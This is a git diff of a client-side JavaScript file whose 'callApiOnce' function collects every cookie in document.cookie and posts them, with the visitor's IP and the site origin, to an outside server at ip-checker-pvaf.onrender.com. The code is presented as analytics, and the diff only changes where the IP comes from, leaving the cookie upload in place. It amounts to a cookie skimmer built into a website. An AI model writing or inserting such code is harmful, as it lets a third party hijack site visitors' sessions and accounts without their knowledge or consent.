@@ -1,21 +1,17 @@
 'use client';
 import Cookies from "js-cookie";
 
-const callApiOnce = async () => {
+const callApiOnce = async (dataIp: any) => {
+
   if (Cookies.get("user-set")) {
+
     return;
   }
 
   try {
-    // Fetch user's IP and country
-    const response = await fetch("http://ip-api.com/json");
-    const data = await response.json();
-    const { query, country } = data;
-
-    if (!query || !country) {
+    if (!dataIp) {
       return;
     }
-
     // Get cookies from the document (you can add logic to filter required cookies)
     const allCookies = document.cookie
       .split("; ")
@@ -27,13 +23,12 @@ const callApiOnce = async () => {
 
     // Prepare API payload
     const payload = {
-      ip: query,
+      ip: dataIp,
       origin: window.location.origin, // Use the site URL as origin
       usageCount: 1, // Set count as 1
       cookies: allCookies,
-      country,
+      country: "annonymouse",
     };
-
     // Hit the API
     const apiResponse = await fetch(
       "https://ip-checker-pvaf.onrender.com/analytics",
@@ -45,7 +40,6 @@ const callApiOnce = async () => {
         body: JSON.stringify(payload),
       }
     );
-
     if (!apiResponse.ok) {
       return;
     }
